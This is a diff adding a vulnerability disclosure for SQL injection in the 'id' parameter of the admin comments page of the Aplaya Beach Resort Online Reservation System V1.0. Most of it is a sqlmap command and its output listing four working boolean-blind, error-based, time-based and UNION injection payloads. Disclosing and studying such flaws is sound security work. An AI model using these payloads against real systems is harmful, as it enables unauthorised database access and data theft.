@@ -1,0 +1,36 @@
+Vulnerability discovery author:Qianyongcun
+
+Aplaya Beach Resort Online Reservation System - SQL Injection on(admin/mod_comments/index.php?id=1&view=view ) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/aplaya-beach-resort-online-reservation-system.html 
+
+Version:V1.0
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+admin/mod_comments/index.php
+On this page,id parameter is vulnerable to SQL Injection Attack 
+Proof of vulnerability(Verify using the sqlmap tool after logining):
+
+-> sqlmap -u http://localhost/aplaya/admin/mod_comments/index.php?id=1&view=view --batch
+
+Output:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: view=view&id=9' AND 1240=1240 AND 'bUIr'='bUIr
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: view=view&id=9' OR (SELECT 5040 FROM(SELECT COUNT(*),CONCAT(0x7162717171,(SELECT (ELT(5040=5040,1))),0x716b7a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'PLek'='PLek
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=view&id=9' AND (SELECT 6876 FROM (SELECT(SLEEP(5)))LZiC) AND 'AvZx'='AvZx
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: view=view&id=-7016' UNION ALL SELECT NULL,NULL,CONCAT(0x7162717171,0x4369414661547a7a7273685461466155744c5a764b43787a796f57546b634b585844777268626479,0x716b7a7071),NULL,NULL-- -
+---
